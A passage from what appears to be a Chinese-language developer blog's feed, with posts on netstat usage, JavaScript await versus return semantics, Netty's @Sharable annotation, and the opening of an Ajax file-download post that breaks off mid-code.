        <content type="html"><![CDATA[<h2 id="Netstat"><a href="#Netstat" class="headerlink" title="Netstat"></a>Netstat</h2><p>Netstat 是一款命令行工具，可用于列出系统上所有的网络套接字连接情况，包括 tcp, udp 以及 unix 套接字，另外它还能列出处于监听状态（即等待接入请求）的套接字。如果你想确认系统上的 Web 服务有没有起来，你可以查看80端口有没有打开。</p><h3 id="语法及选项"><a href="#语法及选项" class="headerlink" title="语法及选项"></a>语法及选项</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat(选项)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">-a或--all：显示所有连线中的Socket；</span><br><span class="line">-A&lt;网络类型&gt;或--&lt;网络类型&gt;：列出该网络类型连线中的相关地址；</span><br><span class="line">-c或--continuous：持续列出网络状态；</span><br><span class="line">-C或--cache：显示路由器配置的快取信息；</span><br><span class="line">-e或--extend：显示网络其他相关信息；</span><br><span class="line">-F或--fib：显示FIB；</span><br><span class="line">-g或--groups：显示多重广播功能群组组员名单；</span><br><span class="line">-h或--help：在线帮助；</span><br><span class="line">-i或--interfaces：显示网络界面信息表单；</span><br><span class="line">-l或--listening：显示监控中的服务器的Socket；</span><br><span class="line">-M或--masquerade：显示伪装的网络连线；</span><br><span class="line">-n或--numeric：直接使用ip地址，而不通过域名服务器；</span><br><span class="line">-N或--netlink或--symbolic：显示网络硬件外围设备的符号连接名称；</span><br><span class="line">-o或--timers：显示计时器；</span><br><span class="line">-p或--programs：显示正在使用Socket的程序识别码和程序名称；</span><br><span class="line">-r或--route：显示Routing Table；</span><br><span class="line">-s或--statistice：显示网络工作信息统计表；</span><br><span class="line">-t或--tcp：显示TCP传输协议的连线状况；</span><br><span class="line">-u或--udp：显示UDP传输协议的连线状况；</span><br><span class="line">-v或--verbose：显示指令执行过程；</span><br><span class="line">-V或--version：显示版本信息；</span><br><span class="line">-w或--raw：显示RAW传输协议的连线状况；</span><br><span class="line">-x或--unix：此参数的效果和指定&quot;-A unix&quot;参数相同；</span><br><span class="line">--ip或--inet：此参数的效果和指定&quot;-A inet&quot;参数相同。</span><br></pre></td></tr></table></figure><h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><ol><li><p>列出所有连接</p> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">netstat -a</span> </span><br><span class="line">Active Internet connections (servers and established)</span><br><span class="line">Proto Recv-Q Send-Q Local Address               Foreign Address             State      </span><br><span class="line">tcp        0      0 *:mysql                     *:*                         LISTEN      </span><br><span class="line">tcp        0      0 *:http                      *:*                         LISTEN      </span><br><span class="line">tcp        0      0 *:ssh                       *:*                         LISTEN      </span><br><span class="line">tcp        0      0 *:https                     *:*                         LISTEN      </span><br><span class="line">tcp        0    440 172.22.203.148:ssh          1.203.10.198:51439          ESTABLISHED </span><br><span class="line">tcp        0      0 172.22.203.148:http         39.116.52.213:45566         ESTABLISHED </span><br><span class="line">udp        0      0 172.22.203.148:ntp          *:*                                     </span><br><span class="line">Active UNIX domain sockets (servers and established)</span><br><span class="line">Proto RefCnt Flags       Type       State         I-Node Path</span><br><span class="line">unix  2      [ ACC ]     STREAM     LISTENING     125319903 /var/lib/mysql/mysql.sock</span><br><span class="line">unix  2      [ ]         DGRAM                    125678271 </span><br><span class="line">unix  2      [ ]         STREAM     CONNECTED     125330402 </span><br><span class="line">unix  2      [ ]         STREAM     CONNECTED     125330400 </span><br><span class="line">unix  2      [ ]         DGRAM                    125320497 </span><br><span class="line">unix  2      [ ]         STREAM     CONNECTED     125303610 </span><br></pre></td></tr></table></figure><p> 上面命令会列出来服务器上所有的tcp、udp及unix套接字等连接信息。</p></li><li><p>只列出 TCP 或 UDP 协议的连接</p><p> 使用 -t 选项列出 TCP 协议的连接：</p> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">netstat -at</span></span><br><span class="line">Active Internet connections (servers and established)</span><br><span class="line">Proto Recv-Q Send-Q Local Address               Foreign Address             State      </span><br><span class="line">tcp        0      0 *:mysql                     *:*                         LISTEN      </span><br><span class="line">tcp        0      0 *:http                      *:*                         LISTEN      </span><br><span class="line">tcp        0      0 *:ssh                       *:*                         LISTEN      </span><br><span class="line">tcp        0      0 *:https                     *:*                         LISTEN      </span><br><span class="line">tcp        0    440 172.22.203.148:ssh          1.203.10.198:51439          ESTABLISHED </span><br></pre></td></tr></table></figure><p> 使用 -u 选项列出 UDP 协议的连接：</p> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Active Internet connections (servers and established)</span><br><span class="line">Proto Recv-Q Send-Q Local Address               Foreign Address             State      </span><br><span class="line">udp        0      0 172.22.203.148:ntp          *:*                                     </span><br><span class="line">udp        0      0 *:ntp                       *:*   </span><br></pre></td></tr></table></figure></li><li><p>禁用反向域名解析，加快查询速度</p><p> 当你不想让主机，端口和用户名显示，使用netstat -n。例如上面的例子中会显示mysql、ssh、http等信息。</p> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Active Internet connections (servers and established)</span><br><span class="line">Proto Recv-Q Send-Q Local Address               Foreign Address             State      </span><br><span class="line">tcp        0      0 0.0.0.0:3306                0.0.0.0:*                   LISTEN      </span><br><span class="line">tcp        0      0 0.0.0.0:80                  0.0.0.0:*                   LISTEN      </span><br><span class="line">tcp        0      0 0.0.0.0:22                  0.0.0.0:*                   LISTEN      </span><br><span class="line">tcp        0      0 0.0.0.0:443                 0.0.0.0:*                   LISTEN      </span><br><span class="line">tcp        0     40 172.22.203.148:22           1.203.80.198:51439          ESTABLISHED </span><br></pre></td></tr></table></figure><p> 如果只是不想让这三个名称中的一个被显示，使用以下命令:</p> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">netsat -a --numeric-ports</span><br><span class="line">netsat -a --numeric-hosts</span><br><span class="line">netsat -a --numeric-users</span><br></pre></td></tr></table></figure></li><li><p>持续输出netstat信息</p><p> <code>-c</code>每隔一秒输出网络信息。</p> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -act</span><br></pre></td></tr></table></figure><p> 上面例子会每隔一秒打印一次所有的tcp连接信息。</p></li><li><p>只列出监听中的连接</p><p> 任何网络服务的后台进程都会打开一个端口，用于监听接入的请求。这些正在监听的套接字也和连接的套接字一样，也能被 netstat 列出来。使用 -l 选项列出正在监听的套接字。</p> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">netstat -lt</span></span><br><span class="line">Active Internet connections (only servers)</span><br><span class="line">Proto Recv-Q Send-Q Local Address               Foreign Address             State      </span><br><span class="line">tcp        0      0 *:mysql                     *:*                         LISTEN      </span><br><span class="line">tcp        0      0 *:http                      *:*                         LISTEN      </span><br><span class="line">tcp        0      0 *:ssh                       *:*                         LISTEN      </span><br><span class="line">tcp        0      0 *:https                     *:*                         LISTEN  </span><br></pre></td></tr></table></figure><p> 上面例子会列出所有监听的tcp连接。如果我们想找到Nginx服务器是哪个进程，就可以使用这个命令：</p> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"> netstat -nltp | grep :80</span></span><br><span class="line">tcp        0      0 0.0.0.0:80                  0.0.0.0:*                   LISTEN      10236/nginx </span><br></pre></td></tr></table></figure><blockquote><p>其中<code>-p</code>用于显示进程信息</p></blockquote></li><li><p>打印网络接口</p><p> netstat 也能打印网络接口信息，-i 选项就是为这个功能而生。</p> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">netstat -i</span></span><br><span class="line">Kernel Interface table</span><br><span class="line">Iface       MTU Met    RX-OK RX-ERR RX-DRP RX-OVR    TX-OK TX-ERR TX-DRP TX-OVR Flg</span><br><span class="line">eth0       1500   0 66299097      0      0      0 56635148      0      0      0 BMRU</span><br><span class="line">lo        65536   0 490435979      0      0      0 490435979      0      0      0 LRU</span><br></pre></td></tr></table></figure><p> 上面输出的信息比较原始。我们将 <code>-e</code> 选项和 <code>-i</code> 选项搭配使用，可以输出用户友好的信息。</p> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">netstat -ie</span></span><br><span class="line">Kernel Interface table</span><br><span class="line">eth0    Link encap:Ethernet  HWaddr 00:16:3E:16:15:19  </span><br><span class="line">        inet addr:172.22.203.148  Bcast:172.22.203.255  Mask:255.255.240.0</span><br><span class="line">        UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1</span><br><span class="line">        RX packets:66299089 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">        TX packets:56635140 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">        collisions:0 txqueuelen:1000 </span><br><span class="line">        RX bytes:34498067027 (32.1 GiB)  TX bytes:96455017529 (89.8 GiB)</span><br><span class="line"></span><br><span class="line">lo      Link encap:Local Loopback  </span><br><span class="line">        inet addr:127.0.0.1  Mask:255.0.0.0</span><br><span class="line">        UP LOOPBACK RUNNING  MTU:65536  Metric:1</span><br><span class="line">        RX packets:490435979 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">        TX packets:490435979 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">        collisions:0 txqueuelen:0 </span><br><span class="line">        RX bytes:33910368878 (31.5 GiB)  TX bytes:33910368878 (31.5 GiB)</span><br></pre></td></tr></table></figure></li><li><p>配合 watch 命令监视和某个IP的所有连接</p> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">watch -d -n0 <span class="string">&quot;netstat -t | grep 1.203.80.198&quot;</span></span></span><br></pre></td></tr></table></figure></li><li><p>统计连接状态</p> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">netstat -n | awk <span class="string">&#x27;/^tcp/ &#123;++S[$NF]&#125; END &#123;for(a in S) print a, S[a]&#125;&#x27;</span></span></span><br><span class="line">CLOSE_WAIT 2</span><br><span class="line">ESTABLISHED 4</span><br></pre></td></tr></table></figure><p> 状态说明</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">CLOSED：无连接是活动的或正在进行</span><br><span class="line">LISTEN：服务器在等待进入呼叫</span><br><span class="line">SYN_RECV：一个连接请求已经到达，等待确认</span><br><span class="line">SYN_SENT：应用已经开始，打开一个连接</span><br><span class="line">ESTABLISHED：正常数据传输状态</span><br><span class="line">FIN_WAIT1：应用说它已经完成</span><br><span class="line">FIN_WAIT2：另一边已同意释放</span><br><span class="line">ITMED_WAIT：等待所有分组死掉</span><br><span class="line">CLOSING：两边同时尝试关闭</span><br><span class="line">TIME_WAIT：另一边已初始化一个释放</span><br><span class="line">LAST_ACK：等待所有分组死掉</span><br></pre></td></tr></table></figure></li></ol><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul><li><a href="https://linux.cn/article-2434-1.html">netstat 的10个基本用法</a></li><li><a href="http://man.linuxde.net/netstat">netstat命令</a></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>await-vs-return-vs-return-await</title>
      <link href="/post/await-vs-return-vs-return-await.html"/>
      <url>/post/await-vs-return-vs-return-await.html</url>
      
        <content type="html"><![CDATA[<h2 id="await-vs-return-vs-return-await"><a href="#await-vs-return-vs-return-await" class="headerlink" title="await vs return vs return await"></a>await vs return vs return await</h2><p>在写<code>async</code>函数时，<code>await</code>、<code>return</code>和<code>return await</code>是不同的，选择正确的写法很重要。</p><p>从下面这个<code>async</code>函数开始吧：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">waitAndMaybeReject</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="comment">// Wait one second</span></span><br><span class="line">  <span class="keyword">await</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function"><span class="params">r</span> =&gt;</span> <span class="built_in">setTimeout</span>(r, <span class="number">1000</span>));</span><br><span class="line">  <span class="comment">// Toss a coin</span></span><br><span class="line">  <span class="keyword">const</span> isHeads = <span class="title class_">Boolean</span>(<span class="title class_">Math</span>.<span class="title function_">round</span>(<span class="title class_">Math</span>.<span class="title function_">random</span>()));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (isHeads) <span class="keyword">return</span> <span class="string">&#x27;yay&#x27;</span>;</span><br><span class="line">  <span class="keyword">throw</span> <span class="title class_">Error</span>(<span class="string">&#x27;Boo!&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个函数1秒后返回一个Promise，返回<code>yay</code>和抛出异常的概率都是50%。下面我们用不同的方式调用它：</p><h3 id="Just-calling"><a href="#Just-calling" class="headerlink" title="Just calling"></a>Just calling</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">foo</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">// waitAndMaybeReject 将返回一个 promise; </span></span><br><span class="line">    <span class="title function_">waitAndMaybeReject</span>();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;caught&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果你调用<code>foo</code>，返回的promise对象总是立即返回<code>undefined</code>，不会等待。</p><p>因为我们没用<code>await</code>或者<code>return</code>执行<code>waitAndMaybeReject</code>函数，对于<code>waitAndMaybeReject</code>我们不能做什么。这种写法一般是错的。</p><blockquote><p><code>waitAndMaybeReject</code>会立即返回一个promise，foo函数会立即结束。我们不会看到<code>waitAndMaybeReject</code>函数内部延迟执行的1s。<code>waitAndMaybeReject</code>函数内部抛出的任何异常和结果我们也无法捕获或者接受。</p></blockquote><h3 id="Awaiting"><a href="#Awaiting" class="headerlink" title="Awaiting"></a>Awaiting</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">foo</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">await</span> <span class="title function_">waitAndMaybeReject</span>();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;caught&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果你调用<code>foo</code>，返回的promise将在1秒后返回一个<code>undefined</code>或者<code>caught</code>。</p><p>因为我们等待<code>waitAndMaybeReject()</code>的执行结果，它抛出的异常将会被<code>catch</code>语句捕获，如果它正常执行这个函数什么将不会返回任何值<code>undefined</code>。</p><blockquote><p>这里相当于调用了<code>waitAndMaybeReject</code>函数，如果<code>waitAndMaybeReject</code>抛出异常我们将忽略掉异常重新返回一个<code>caught</code>字符串，如果<code>waitAndMaybeReject</code>没有抛出异常，<code>foo</code>函数将无返回值<code>undefined</code>。</p></blockquote><h3 id="Returning"><a href="#Returning" class="headerlink" title="Returning"></a>Returning</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">foo</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">waitAndMaybeReject</span>();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;caught&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果你调用<code>foo</code>，这个返回的promise对象将等待1秒后返回<code>yay</code>或者抛出一个<code>Boo!</code>异常。</p><p>这里我们<code>foo</code>的返回值其实就是<code>waitAndMaybeReject</code>的返回值，我们的<code>catch</code>语句将永远不会执行。</p><blockquote><p>这个<code>foo</code>函数的封装毫无意义，相当于直接调用<code>waitAndMaybeReject</code>。</p></blockquote><h3 id="Return-awaiting"><a href="#Return-awaiting" class="headerlink" title="Return-awaiting"></a>Return-awaiting</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">foo</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">await</span> <span class="title function_">waitAndMaybeReject</span>();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;caught&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们调用<code>foo</code>后，返回的promise将等待1秒后返回一个<code>yay</code>或者<code>caught</code>。</p><p>当我们等待<code>waitAndMaybeReject()</code>的结果时，它如果抛出异常将被我们的<code>catch</code>语句捕获，我们会返回一个<code>catch</code>字符串，如果这个函数正常执行，我们将返回它的返回值<code>yay</code>。</p><p>我们将上面函数拆分成两步就是下面的形式：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">foo</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">// Wait for the result of waitAndMaybeReject() to settle,</span></span><br><span class="line">    <span class="comment">// and assign the fulfilled value to fulfilledValue:</span></span><br><span class="line">    <span class="keyword">const</span> fulfilledValue = <span class="keyword">await</span> <span class="title function_">waitAndMaybeReject</span>();</span><br><span class="line">    <span class="comment">// If the result of waitAndMaybeReject() rejects, our code</span></span><br><span class="line">    <span class="comment">// throws, and we jump to the catch block.</span></span><br><span class="line">    <span class="comment">// Otherwise, this block continues to run:</span></span><br><span class="line">    <span class="keyword">return</span> fulfilledValue;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;caught&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意：如果没有<code>try/catch</code>包裹的<code>return await</code>函数是冗余的，可以使用<a href="https://github.com/eslint/eslint/blob/master/docs/rules/no-return-await.md">ESLint</a>去检测。但是在<code>try/catch</code>里面是允许的。</p><blockquote><p>如果没有<code>try/catch</code>包裹时<code>waitAndMaybeReject</code>抛异常，将会从<code>foo</code>里面抛出去，如果正确返回将会从foo的结果中获取。这相当于<code>return waitAndMaybeReject()</code>，我们直接使用<code>waitAndMaybeReject()</code>返回的promise比<code>foo</code>返回的promise更简单清晰。</p></blockquote><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul><li><a href="https://jakearchibald.com/2017/await-vs-return-vs-return-await/">await vs return vs return await</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> async </tag>
            
            <tag> await </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Netty Sharable Handler</title>
      <link href="/post/netty-sharable-handler.html"/>
      <url>/post/netty-sharable-handler.html</url>
      
        <content type="html"><![CDATA[<h2 id="Sharable"><a href="#Sharable" class="headerlink" title="@Sharable"></a>@Sharable</h2><p>对于<code>@Sharable</code>文档里面是这样说明的</p><blockquote><p>对于这种用法指在多个<code>ChannelPipeline</code>中共享同一个<code>ChannelHandler</code>，对应的<code>ChannelHandler</code>必须要使用<code>@Sharable</code>注解标注；否则，试图将它添加到多个<code>ChannelPipeline</code>时将会触发异常。</p></blockquote><p><code>@Sharable</code>其实就是一个<code>标识型的注解</code>，可以认为我们标识这个<code>ChannelHandler</code>是线程安全的。</p><p>下面例子中<code>ChannelInboundHandler1</code>是无状态的，<code>ChannelInboundHandler2</code>是有状态的。<code>ChannelInboundHandler1</code>天然是线程安全的，我们在多个<code>ChannelPipeline</code>使用同一个Handler示例就可以减少对象的频繁创建和垃圾回收。如果想在多个<code>ChannelPipeline</code>中共享<code>ChannelInboundHandler1</code>实例就要将其标注为<code>@Sharable</code>，否则需要每次都<code>new</code>一个新的实例。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 无状态</span></span><br><span class="line"><span class="meta">@ChannelHandler</span>.Sharable</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ChannelInboundHandler1</span> <span class="keyword">extends</span> <span class="title class_">ChannelInboundHandlerAdapter</span> &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 有状态</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ChannelInboundHandler2</span> <span class="keyword">extends</span> <span class="title class_">ChannelInboundHandlerAdapter</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> ChannelHandlerContext ctx;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handlerAdded</span><span class="params">(ChannelHandlerContext ctx)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="built_in">this</span>.ctx = ctx;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WebSocketChatServerInitializer</span> <span class="keyword">extends</span> <span class="title class_">ChannelInitializer</span>&lt;SocketChannel&gt; &#123; </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">ChannelInboundHandler1</span> <span class="variable">channelInboundHandler1</span> <span class="operator">=</span>  <span class="keyword">new</span> <span class="title class_">ChannelInboundHandler1</span>();</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">initChannel</span><span class="params">(SocketChannel ch)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ChannelPipeline</span> <span class="variable">pipeline</span> <span class="operator">=</span> ch.pipeline();</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// channelInboundHandler1 线程安全的，多ChannelPipeline共享一个。</span></span><br><span class="line">        pipeline.addLast(<span class="string">&quot;channelInboundHandler1&quot;</span>, channelInboundHandler1);</span><br><span class="line">        <span class="comment">// channelInboundHandler1 非线程安全的，为每个ChannelPipeline都创建一个实例。</span></span><br><span class="line">        pipeline.addLast(<span class="string">&quot;channelInboundHandler2&quot;</span>, <span class="keyword">new</span> <span class="title class_">ChannelInboundHandler2</span>());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> netty </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>通过Ajax下载文件</title>
      <link href="/post/file-download-via-ajax.html"/>
      <url>/post/file-download-via-ajax.html</url>
      
        <content type="html"><![CDATA[<h2 id="通过Ajax下载文件"><a href="#通过Ajax下载文件" class="headerlink" title="通过Ajax下载文件"></a>通过Ajax下载文件</h2><p>参考网站<a href="https://send.firefox.com/">https://send.firefox.com/</a> <a href="https://github.com/mozilla/send">Github</a></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">id</span>=<span class="string">&quot;GetFile&quot;</span>&gt;</span>Get File!<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><figcaption><span>file_download_via_ajax.js</span><a href="/downloads/code/file_download_via_ajax.js">view raw</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span 